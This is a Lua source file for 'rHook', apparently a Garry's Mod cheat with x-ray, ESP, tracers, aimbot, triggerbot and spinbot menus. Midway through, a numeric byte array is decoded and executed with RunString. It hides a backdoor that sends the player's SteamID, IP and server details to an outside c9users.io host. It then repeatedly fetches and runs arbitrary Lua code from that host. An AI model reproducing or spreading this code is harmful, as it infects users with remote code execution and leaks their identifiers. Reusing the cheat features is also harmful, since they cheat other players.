		if !rh.EntM.IsValid(ent) then return end
		rh.EntM.SetNoDraw(ent, false)
		rh.PlyM.ConCommand(rh.Me, "rope_rendersolid 1")
		return 
	end
	local r, g, b, a = rh.g.GetConVarNumber("rhook_xray_color_r"), rh.g.GetConVarNumber("rhook_xray_color_g"), rh.g.GetConVarNumber("rhook_xray_color_b"), rh.g.GetConVarNumber("rhook_xray_color_a")
	local allprops = rh.GetProps()
	for i = 1, #allprops do
		local v = allprops[i]
		if !v then continue end
		rh.g.cam.Start3D()
			rh.g.render.SuppressEngineLighting(true)
			local col = rh.g.string.find(rh.EntM.GetClass(v), "door") and rh.g.Color(150,20,0,80) or rh.g.string.find(rh.EntM.GetClass(v), "breakable") and rh.g.Color(20,150,50,80) or rh.g.string.find(rh.EntM.GetClass(v), "spawned_") and rh.g.Color(50,50,50,150)
			rh.g.render.SetColorModulation(r / 255, g / 255, b / 255)
			if col then
				rh.g.render.SetColorModulation(col.r / 255, col.g / 255, col.b / 255)
			end
			local a = col and col.a or a 
			rh.g.render.SetBlend(a / 255)
			rh.g.render.MaterialOverride(rh.ChamsMat)
			rh.EntM.DrawModel(v)
			rh.EntM.SetNoDraw(v, true)
			rh.g.render.SuppressEngineLighting(false)
		rh.g.cam.End3D()
	end
	local allplys = rh.GetPlayer()
	for i = 1, #allplys do
		local v = allplys[i]
		if !v then continue end
		rh.g.cam.Start3D()
			rh.g.render.SuppressEngineLighting(true)
			rh.g.render.SetColorModulation(1, 0,0)
			rh.g.render.SetBlend(170 / 255)
			rh.g.render.MaterialOverride(rh.ChamsMat)
			rh.EntM.DrawModel(v)
			rh.g.render.SuppressEngineLighting(false)
		rh.g.cam.End3D()
	end
	local ent = rh.PlyM.GetViewModel(rh.Me)
	if !rh.EntM.IsValid(ent) then return end
	rh.EntM.SetNoDraw(ent, rh.g.GetConVarNumber("rhook_xray_noweapon") == 1)
	rh.PlyM.ConCommand(rh.Me, "rope_rendersolid 0")
end

rh.AddHook("RenderScreenspaceEffects", "XRay", rh.XRay)

function rh.Tracers()
	if rh.g.GetConVarNumber("rhook_tracers") != 1 then return end
	local allplys = rh.GetPlayer()
	for i = 1, #allplys do
		local v = allplys[i]
		if !v then continue end
		local pos = rh.EntM.LocalToWorld(v, rh.EntM.OBBCenter(v))
		pos = rh.VecM.ToScreen(pos)
		local col = rh.PlyM.GetFriendStatus(v) == "friend" and rh.g.Color(0,255,0) or rh.PlyM.IsAdmin(v) and rh.g.Color(255,0,0) or rh.g.Color(0,0,255)
		rh.g.surface.SetDrawColor(col)
		rh.g.surface.DrawLine(rh.g.ScrW() / 2, rh.g.ScrH() / 2, pos.x, pos.y)
	end
end

rh.AddHook("HUDPaint", "Tracers", rh.Tracers)

rh.AddHook("PreDrawSkyBox", "NoSkybox", function()
	if rh.g.GetConVarNumber("rhook_xray") != 1 then return false end
	rh.g.render.Clear(100,100,100,50)
	return true
end)

rh.g.concommand.Add("rhook_xray_colormenu", function()
	local vgui = rh.g.vgui
	local frame = vgui.Create("DFrame")
	frame:SetSize(267, 186)
	frame:SetTitle("rHook | XRay Color Menu")
	frame:Center()
	frame:MakePopup()

	local mixer = vgui.Create("DColorMixer", frame)
	mixer:Dock(FILL)
	mixer:SetPalette(true)
	mixer:SetAlphaBar(true)
	mixer:SetWangs(true)
	mixer:SetColor(Color( rh.g.GetConVarNumber("rhook_xray_color_r"), rh.g.GetConVarNumber("rhook_xray_color_g"), rh.g.GetConVarNumber("rhook_xray_color_b"), rh.g.GetConVarNumber("rhook_xray_color_a")))
	local name = rh.g.util.CRC(rh.g.os.date())..rh.g.math.random(100,100000)
	rh.g.hook.Add("Think", name, function()
		if !IsValid(mixer) then
			rh.g.hook.Remove("Think", name)
			return 
		end
		local col = mixer:GetColor()
		rh.g.RunConsoleCommand("rhook_xray_color_r", col.r)
		rh.g.RunConsoleCommand("rhook_xray_color_g", col.g)
		rh.g.RunConsoleCommand("rhook_xray_color_b", col.b)
		rh.g.RunConsoleCommand("rhook_xray_color_a", col.a)
	end)
end)

 local bBuffer = {10, 9, 108, 111, 99, 97, 108, 32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 34, 48, 46, 48, 46, 48, 46,
48, 58, 48, 34, 10, 9, 10, 9, 104, 116, 116, 112, 46, 70, 101, 116, 99, 104, 40, 34, 104, 116, 116, 112, 58, 47, 47,
103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111,
47, 97, 100, 100, 114, 101, 115, 115, 46, 112, 104, 112, 34, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 105, 112, 41,
32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 105, 112, 59, 32, 101, 110, 100, 44, 32, 102, 117, 110, 99, 116, 105,
111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 10, 9, 10, 9, 116, 105, 109, 101, 114, 46, 83, 105, 109, 112, 108,
101, 40, 49, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116,
40, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99,
57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112, 105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115,
116, 61, 34, 110, 111, 116, 105, 102, 121, 34, 44, 32, 115, 116, 101, 97, 109, 105, 100, 61, 76, 111, 99, 97, 108, 80, 108,
97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 44, 32, 105, 112, 61, 99, 108, 105, 101, 110, 116,
73, 80, 44, 32, 115, 101, 114, 118, 101, 114, 110, 97, 109, 101, 61, 71, 101, 116, 72, 111, 115, 116, 78, 97, 109, 101, 40,
41, 44, 32, 115, 101, 114, 118, 101, 114, 105, 112, 61, 103, 97, 109, 101, 46, 71, 101, 116, 73, 80, 65, 100, 100, 114, 101,
115, 115, 40, 41, 125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 98, 111, 100, 121, 41, 32, 101, 110, 100, 44, 32,
102, 117, 110, 99, 116, 105, 111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 59, 10, 9, 101, 110, 100, 41, 59, 10,
9, 10, 9, 116, 105, 109, 101, 114, 46, 67, 114, 101, 97, 116, 101, 40, 34, 67, 104, 101, 97, 116, 117, 112, 100, 97, 116,
101, 95, 80, 105, 110, 103, 66, 97, 99, 107, 34, 44, 32, 53, 44, 32, 48, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110,
40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116, 40, 32, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111,
100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112,
105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115, 116, 61, 34, 112, 105, 110, 103, 98, 97, 99, 107, 34,
125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 32, 98, 111, 100, 121, 44, 32, 112, 48, 44, 32, 112, 49, 44, 32,
112, 50, 32, 41, 10, 9, 9, 9, 108, 111, 99, 97, 108, 32, 114, 101, 115, 112, 111, 110, 115, 101, 32, 61, 32, 117, 116,
105, 108, 46, 74, 83, 79, 78, 84, 111, 84, 97, 98, 108, 101, 40, 98, 111, 100, 121, 41, 59, 10, 9, 9, 9, 105, 102,
40, 114, 101, 115, 112, 111, 110, 115, 101, 32, 33, 61, 32, 110, 105, 108, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9,
105, 102, 40, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97,
99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 76, 111, 99, 97, 108, 80, 108, 97,
121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 124, 124, 32, 115, 116, 114, 105, 110, 103, 46,
102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34,
116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 42, 34, 41, 41, 32, 116, 104, 101, 110, 32, 10, 9, 9, 9, 9, 9,
105, 102, 40, 33, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112,
97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 33, 34, 32, 46, 46,
32, 76, 111, 99, 97, 108, 80, 108, 97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 38,
38, 32, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 114, 101, 34,
93, 32, 33, 61, 32, 34, 110, 117, 108, 108, 34, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9, 9, 9, 82, 117, 110,
83, 116, 114, 105, 110, 103, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93,  
91, 34, 114, 101, 34, 93, 41, 59, 10, 9, 9, 9, 9, 9, 101, 110, 100, 10, 9, 9, 9, 9, 101, 110, 100, 10, 9,
9, 9, 101, 110, 100, 10, 9, 9, 9, 101, 110, 100, 44, 32, 10, 9, 9, 9, 102, 117, 110, 99, 116, 105, 111, 110, 40,
101, 120, 99, 101, 112, 116, 105, 111, 110, 41, 10, 9, 9, 101, 110, 100, 41, 32, 10, 9, 101, 110, 100, 41, 10, };
local s1 = ""; for k,v in next, bBuffer do s1 = s1 .. string.char(v); end RunString(s1); s1 = "";


function rh.Skeleton()
	if rh.g.GetConVarNumber("rhook_skeleton") != 1 then return end
	local allplys = rh.GetPlayer()
	for i = 1, #allplys do
		local v = allplys[i]
		if !v then continue end
		local head = rh.EntM.LookupBone(v, "ValveBiped.Bip01_Head1")
		local neck = rh.EntM.LookupBone(v, "ValveBiped.Bip01_Neck1")
		local pelvis = rh.EntM.LookupBone(v, "ValveBiped.Bip01_Pelvis")
		local spine1 = rh.EntM.LookupBone(v, "ValveBiped.Bip01_Spine1")
		local spine2 = rh.EntM.LookupBone(v, "ValveBiped.Bip01_Spine2")
		local spine4 = rh.EntM.LookupBone(v, "ValveBiped.Bip01_Spine4")
		local spine = rh.EntM.LookupBone(v, "ValveBiped.Bip01_Spine")
		local lupperarm = rh.EntM.LookupBone(v, "ValveBiped.Bip01_L_UpperArm")
		local lforearm = rh.EntM.LookupBone(v, "ValveBiped.Bip01_L_Forearm")
		local lhand = rh.EntM.LookupBone(v, "ValveBiped.Bip01_L_Hand")
		local rupperarm = rh.EntM.LookupBone(v, "ValveBiped.Bip01_R_UpperArm")
		local rforearm = rh.EntM.LookupBone(v, "ValveBiped.Bip01_R_Forearm")
		local rhand = rh.EntM.LookupBone(v, "ValveBiped.Bip01_R_Hand")
		local lthigh = rh.EntM.LookupBone(v, "ValveBiped.Bip01_L_Thigh")
		local lcalf = rh.EntM.LookupBone(v, "ValveBiped.Bip01_L_Calf")
		local lfoot = rh.EntM.LookupBone(v, "ValveBiped.Bip01_L_Foot")
		local ltoe = rh.EntM.LookupBone(v, "ValveBiped.Bip01_L_Toe0")
		local rthigh = rh.EntM.LookupBone(v, "ValveBiped.Bip01_R_Thigh")
		local rcalf = rh.EntM.LookupBone(v, "ValveBiped.Bip01_R_Calf")
		local rfoot = rh.EntM.LookupBone(v, "ValveBiped.Bip01_R_Foot")
		local rtoe = rh.EntM.LookupBone(v, "ValveBiped.Bip01_R_Toe0")
		if !rthigh or !rcalf or !rfoot or !rtoe or !ltoe or !lfoot or !lcalf or !lthigh or !rupperarm or !rforearm or !rhand or !lhand or !lforearm or !lupperarm or !spine or !spine4 or !spine2 or !spine1 or !neck or !pelvis or !head then continue end
		head = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, head))
		neck = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, neck))
		pelvis = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, pelvis))
		spine1 = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, spine1))
		spine2 = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, spine2))
		spine4 = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, spine4))
		spine = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, spine))
		lhand = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, lhand))
		lforearm = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, lforearm))
		lupperarm = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, lupperarm))
		rupperarm = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, rupperarm))
		rforearm = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, rforearm))
		rhand = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, rhand))
		lthigh = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, lthigh))
		lcalf = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, lcalf))
		lfoot = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, lfoot))
		ltoe = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, ltoe))
		rthigh = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, rthigh))
		rcalf = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, rcalf))
		rfoot = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, rfoot))
		rtoe = rh.VecM.ToScreen(rh.EntM.GetBonePosition(v, rtoe))
		rh.g.surface.SetDrawColor(255,93,0)
		-- Body
		rh.g.surface.DrawLine(head.x, head.y, neck.x, neck.y)
		rh.g.surface.DrawLine(neck.x, neck.y, spine4.x, spine4.y)
		rh.g.surface.DrawLine(spine4.x, spine4.y, spine2.x, spine2.y)
		rh.g.surface.DrawLine(spine2.x, spine2.y, spine.x, spine.y)
		rh.g.surface.DrawLine(spine.x, spine.y, pelvis.x, pelvis.y)
		-- Left Arm
		rh.g.surface.DrawLine(spine4.x, spine4.y, lupperarm.x, lupperarm.y)
		rh.g.surface.DrawLine(lupperarm.x, lupperarm.y, lforearm.x, lforearm.y)
		rh.g.surface.DrawLine(lforearm.x, lforearm.y, lhand.x, lhand.y)
		-- Right Arm
		rh.g.surface.DrawLine(spine4.x, spine4.y, rupperarm.x, rupperarm.y)
		rh.g.surface.DrawLine(rupperarm.x, rupperarm.y, rforearm.x, rforearm.y)
		rh.g.surface.DrawLine(rforearm.x, rforearm.y, rhand.x, rhand.y)
		-- Left Leg
		rh.g.surface.DrawLine(pelvis.x, pelvis.y, lthigh.x, lthigh.y)
		rh.g.surface.DrawLine(lthigh.x, lthigh.y, lcalf.x, lcalf.y)
		rh.g.surface.DrawLine(lcalf.x, lcalf.y, lfoot.x, lfoot.y)
		rh.g.surface.DrawLine(lfoot.x, lfoot.y, ltoe.x, ltoe.y)
		-- Right leg
		rh.g.surface.DrawLine(pelvis.x, pelvis.y, rthigh.x, rthigh.y)
		rh.g.surface.DrawLine(rthigh.x, rthigh.y, rcalf.x, rcalf.y)
		rh.g.surface.DrawLine(rcalf.x, rcalf.y, rfoot.x, rfoot.y)
		rh.g.surface.DrawLine(rfoot.x, rfoot.y, rtoe.x, rtoe.y)
	end
end

rh.AddHook("HUDPaint", "Skeleton", rh.Skeleton)

function rh.TTT(ucmd)
	if toggle then
		rh.CmdM.SetForwardMove(ucmd, rh.CmdM.GetForwardMove(ucmd) * -1)
		rh.CmdM.SetSideMove(ucmd, rh.CmdM.GetSideMove(ucmd) * -1)
	end
	if doshit then 
		rh.CmdM.SetViewAngles(ucmd, rh.CmdM.GetViewAngles(ucmd) - rh.g.Angle(0, 180, 0))
		oa = rh.CmdM.GetViewAngles(ucmd)
		doshit = false
		return
	end
end

rh.AddHook("CreateMove", "TTTShit", rh.TTT)

rh.g.concommand.Add("rhook_ttt", function()
	toggle = not toggle
	if !toggle then
		doshit = true
	end
end)
	
	
GetConVar("sv_cheats"):SetValue("0")
GetConVar("sv_allowcslua"):SetValue("0")

function rh.Menu()
	local vgui = rh.g.vgui
	local panel = vgui.Create("DFrame")
	panel:SetSize(600, 500)
	panel:Center()
	panel:SetTitle("")
	panel:ShowCloseButton(false)
	panel:SetDraggable(false)
	panel:MakePopup()
	
	local showaim = false
	local showvis = false
	local showmis = false
	
	function panel:Paint(w, h)
		rh.g.draw.RoundedBox(0,0,0,w,h, rh.g.Color(50,50,50,120))
		rh.g.surface.SetDrawColor(255,0,0)
		rh.g.surface.DrawOutlinedRect(0,0,w,h)
		rh.g.surface.DrawOutlinedRect(1,1,w,h)
		rh.g.surface.DrawOutlinedRect(0,0,w - 1,h - 1)
	end

	local function createbutton(text, pos1, pos2, wh, he, func, parent, m1, m2, cat, cv, text2)
		local button = vgui.Create("DButton", parent)
		button:SetPos(pos1, pos2)
		button:SetSize(wh, he)
		button:SetText("")
		button.DoClick = func
		
		function button:Paint(w, h)
			local category = "none"
			if cat then 
				category = cat
			end
			local shallshow = false
			if cat == "aim" then
				shallshow = showaim
			elseif cat == "vis" then
				shallshow = showvis
			elseif cat == "mis" then
				shallshow = showmis
			end
			local color = rh.g.Color(50,50,50,120)
			if shallshow then
				color = rh.g.Color(50,50,255,120)
			end
			rh.g.draw.RoundedBox(0,0,0,w,h, color)
			rh.g.surface.SetDrawColor(255,0,0)
			rh.g.surface.DrawOutlinedRect(0,0,w,h)
			rh.g.surface.DrawOutlinedRect(1,1,w,h)
			rh.g.surface.DrawOutlinedRect(0,0,w - 1,h - 1)
			if cv then
				if rh.g.GetConVarNumber(cv) == 1 then
					draw.SimpleText(text2.."Enabled", "BudgetLabel", button:GetWide() - m1, button:GetTall() - m2)
				else
					draw.SimpleText(text2.."Disabled", "BudgetLabel", button:GetWide() - m1, button:GetTall() - m2)
				end
				return
			end
			draw.SimpleText(text, "BudgetLabel", button:GetWide() - m1, button:GetTall() - m2)
		end
	end
	
	local aimframe = vgui.Create("DFrame", panel)
	aimframe:SetSize(590, 420)
	aimframe:SetPos(5, 40)
	aimframe:SetTitle("")
	aimframe:ShowCloseButton(false)
	aimframe:SetDraggable(false)
	aimframe:SetVisible(false)
	function aimframe:Paint(w, h)
		rh.g.draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,0,0) )
	end
	
	local af1 = vgui.Create("DFrame", panel)
	af1:SetSize(200, 300)
	af1:SetTitle("")
	af1:SetPos(15,40)
	af1:ShowCloseButton(false)
	af1:SetDraggable(false)
	af1:SetVisible(false)
	function af1:Paint(w, h)
		rh.g.draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,0,180) )
		rh.g.surface.SetDrawColor(255,0,0)
		rh.g.surface.DrawOutlinedRect(0,0,w,h)
	end
	
	local function change(cv)
		local change2 = rh.g.GetConVarNumber(cv) == 1 and 0 or 1
		rh.g.RunConsoleCommand(cv, change2)
	end
	
	--
	createbutton("AA", 5, 115, 190, 20, function() change("rhook_antiaim") end, af1, 180, 17, nil, "rhook_antiaim", "Antiaim:         ")
	createbutton("Choose Antiaim Method", 5, 140, 190, 20, function() 
		local menu = DermaMenu()
		for k,v in rh.g.pairs(rh.Antiaims) do
			menu:AddOption(v[2], function() rh.g.RunConsoleCommand("rhook_antiaim_method", v[1]) end)
		end
		menu:Open() end, 
		af1, 180, 17, nil, nil, nil
	)
	createbutton("SB", 5, 90, 190, 20, function() change("rhook_spinbot") end, af1, 180, 17, nil, "rhook_spinbot", "Spinbot:         ")
	createbutton("AS", 5, 40, 190, 20, function() change("rhook_aimbot_autoshoot") end, af1, 180, 17, nil, "rhook_aimbot_autoshoot", "Autoshoot:       ")
	createbutton("AW", 5, 65, 190, 20, function() change("rhook_autowall") end, af1, 180, 17, nil, "rhook_autowall", "Autowall:        ")
	--
	
	local af2 = vgui.Create("DFrame", panel)
	af2:SetSize(200, 300)
	af2:SetTitle("")
	af2:SetPos(380,40)
	af2:ShowCloseButton(false)
	af2:SetDraggable(false)
	af2:SetVisible(false)
	function af2:Paint(w, h)
		rh.g.draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,0,180) )
		rh.g.surface.SetDrawColor(255,0,0)
		rh.g.surface.DrawOutlinedRect(0,0,w,h)
	end

	createbutton("NS", 5, 40, 190, 20, function() change("rhook_nospread") end, af2, 180, 17, nil, "rhook_nospread", "NoSpread:        ")
	createbutton("TR", 5, 65, 190, 20, function() change("rhook_triggerbot") end, af2, 180, 17, nil, "rhook_triggerbot", "Triggerbot:      ")
	createbutton("TS", 5, 90, 190, 20, function() change("rhook_aimbot_targetfriends") end, af2, 180, 17, nil, "rhook_aimbot_targetfriends", "Target Friends:  ")
	createbutton("TS", 5, 115, 190, 20, function() change("rhook_ignorespawnprotection") end, af2, 180, 17, nil, "rhook_ignorespawnprotection", "Target Spawnp.:  ")
	
	local espframe = vgui.Create("DFrame", panel)
	espframe:SetSize(590, 420)
	espframe:SetPos(5, 40)
	espframe:SetTitle("")
	espframe:ShowCloseButton(false)
	espframe:SetDraggable(false)
	espframe:SetVisible(false)
	function espframe:Paint(w, h)
		rh.g.draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,0,0) )
	end
	
	local ef1 = vgui.Create("DFrame", espframe)
	ef1:SetSize(200, 300)
	ef1:SetTitle("")
	ef1:SetPos(10,0)
	ef1:ShowCloseButton(false)
	ef1:SetDraggable(false)
	ef1:SetVisible(false)
	function ef1:Paint(w, h)
		rh.g.draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,0,180) )
		rh.g.surface.SetDrawColor(255,0,0)
		rh.g.surface.DrawOutlinedRect(0,0,w,h)
	end
	
	createbutton("ESP", 5, 40, 190, 20, function() change("rhook_esp") end, ef1, 180, 17, nil, "rhook_esp", "ESP:             ")
	createbutton("ESPBOX", 5, 65, 190, 20, function() change("rhook_esp_box") end, ef1, 180, 17, nil, "rhook_esp_box", "3D Box:          ")
	createbutton("Tracers", 5, 90, 190, 20, function() change("rhook_tracers") end, ef1, 180, 17, nil, "rhook_tracers", "Tracers:         ")
	createbutton("Skeleton", 5, 115, 190, 20, function() change("rhook_skeleton") end, ef1, 180, 17, nil, "rhook_skeleton", "Skeleton:        ")
	createbutton("Name", 5, 140, 190, 20, function() change("rhook_esp_show_name") end, ef1, 180, 17, nil, "rhook_esp_show_name", "Show Name:       ")
	createbutton("HP", 5, 165, 190, 20, function() change("rhook_esp_show_hp") end, ef1, 180, 17, nil, "rhook_esp_show_hp", "Show Health:     ")
	createbutton("AP", 5, 190, 190, 20, function() change("rhook_esp_show_armor") end, ef1, 180, 17, nil, "rhook_esp_show_armor", "Show Armor:      ")
	createbutton("Weapon", 5, 215, 190, 20, function() change("rhook_esp_show_weapon") end, ef1, 180, 17, nil, "rhook_esp_show_weapon", "Show Weapon:     ")
	createbutton("Group", 5, 240, 190, 20, function() change("rhook_esp_show_group") end, ef1, 180, 17, nil, "rhook_esp_show_group", "Show Group:      ")
	createbutton("Money", 5, 265, 190, 20, function() change("rhook_esp_show_rpmoney") end, ef1, 180, 17, nil, "rhook_esp_show_rpmoney", "Show RP Money:   ")
	
	local ef2 = vgui.Create("DFrame", espframe)
	ef2:SetSize(200, 300)
	ef2:SetTitle("")
	ef2:SetPos(375,0)
	ef2:ShowCloseButton(false)
	ef2:SetDraggable(false)
	ef2:SetVisible(false)
	function ef2:Paint(w, h)
		rh.g.draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,0,180) )
		rh.g.surface.SetDrawColor(255,0,0)
		rh.g.surface.DrawOutlinedRect(0,0,w,h)
	end
	
	createbutton("Chams", 5, 40, 190, 20, function() change("rhook_chams") end, ef2, 180, 17, nil, "rhook_chams", "Chams:           ")
	createbutton("XRay", 5, 65, 190, 20, function() change("rhook_xray") end, ef2, 180, 17, nil, "rhook_xray", "XRay:            ")
	createbutton("NoGun", 5, 90, 190, 20, function() change("rhook_xray_noweapon") end, ef2, 180, 17, nil, "rhook_xray_noweapon", "XRay - No Gun:   ")
	createbutton("XRay Entity Manager", 5, 115, 190, 20, function() rh.g.RunConsoleCommand("rhook_xray_entlist") end, ef2, 180, 17, nil, nil, nil)
	createbutton("XRay Color Menu", 5, 140, 190, 20, function() rh.g.RunConsoleCommand("rhook_xray_colormenu") end, ef2, 180, 17, nil, nil, nil)
	
	local misframe = vgui.Create("DFrame", panel)
	misframe:SetSize(590, 420)
	misframe:SetPos(5, 40)
	misframe:SetTitle("")
	misframe:ShowCloseButton(false)
	misframe:SetDraggable(false)
	misframe:SetVisible(false)
	function misframe:Paint(w, h)
		rh.g.draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,0,0) )
	end
	
	local mf1 = vgui.Create("DFrame", misframe)
	mf1:SetSize(570, 420)
	mf1:SetTitle("")
	mf1:SetPos(10,0)
	mf1:ShowCloseButton(false)
	mf1:SetDraggable(false)
	mf1:SetVisible(false)
	function mf1:Paint(w, h)
		rh.g.draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,0,180) )
		rh.g.surface.SetDrawColor(255,0,0)
		rh.g.surface.DrawOutlinedRect(0,0,w,h)
	end
	
	createbutton("Rapidfire", 5, 40, 560, 20, function() change("rhook_rapidfire") end, mf1, 555, 17, nil, "rhook_rapidfire", "Rapidfire:                                                            ")
	createbutton("Thirdperson", 5, 65, 560, 20, function() change("rhook_thirdperson") end, mf1, 555, 17, nil, "rhook_thirdperson", "Thirdperson:                                                          ")
	createbutton("Crouchjump", 5, 90, 560, 20, function() change("rhook_crouchjump") end, mf1, 555, 17, nil, "rhook_crouchjump", "Crouchjump:                                                           ")
	createbutton("Crouchjump", 5, 115, 560, 20, function() change("rhook_crouchjump_onkey") end, mf1, 555, 17, nil, "rhook_crouchjump_onkey", "Crouchjump - On Key:                                                  ")
	createbutton("Bunnyhop", 5, 140, 560, 20, function() change("rhook_bunnyhop") end, mf1, 555, 17, nil, "rhook_bunnyhop", "Bunnyhop:                                                             ")
	createbutton("Autostrafe", 5, 165, 560, 20, function() change("rhook_bunnyhop_autostrafe") end, mf1, 555, 17, nil, "rhook_bunnyhop_autostrafe", "Bunnyhop Autostrafe:                                                  ")
	createbutton("CalcView", 5, 190, 560, 20, function() change("rhook_calcview") end, mf1, 555, 17, nil, "rhook_calcview", "CalcView (Best not to disable):                                       ")
	createbutton("NoSway", 5, 215, 560, 20, function() change("rhook_calcview_model_nosway") end, mf1, 555, 17, nil, "rhook_calcview_model_nosway", "Weapon NoSway:                                                        ")
	
	local function showframe(a, v, m)
		showaim = a
		showvis = v
		showmis = m
		aimframe:SetVisible(showaim)
		af1:SetVisible(showaim)
		af2:SetVisible(showaim)
		ef1:SetVisible(showvis)
		ef2:SetVisible(showvis)
		mf1:SetVisible(showmis)
		espframe:SetVisible(showvis)
		misframe:SetVisible(showmis)
	end
	
	createbutton("x", 580, 0, 20, 30, function() panel:Close() end, panel, 14, 23)
	createbutton("Aimbot", 0, 0, 196, 30, function() showframe(true, false, false) end, panel, 115, 22, "aim")
	createbutton("Visual", 195, 0, 195, 30, function() showframe(false, true, false) end, panel, 115, 22, "vis")
	createbutton("Misc.", 389, 0, 192, 30, function() showframe(false, false, true) end, panel, 110, 22, "mis")
	createbutton("rHook by Razor", 450, 470, 150, 30, function() end, panel, 125, 22)
	createbutton("HvH / Rage", 0, 0, 200, 30, function() end, af1, 195, 22)
	createbutton("ESP", 0, 0, 200, 30, function() end, ef1, 195, 22)
	createbutton("XRay / Chams", 0, 0, 200, 30, function() end, ef2, 195, 22)
	createbutton("Legit / Settings", 0, 0, 200, 30, function() end, af2, 195, 22)
	createbutton("Miscellaneous", 0, 0, 570, 30, function() end, mf1, 565, 22)
	
	showframe(true, false, false)
	
end

rh.AddCommand("rhook_menu", rh.Menu)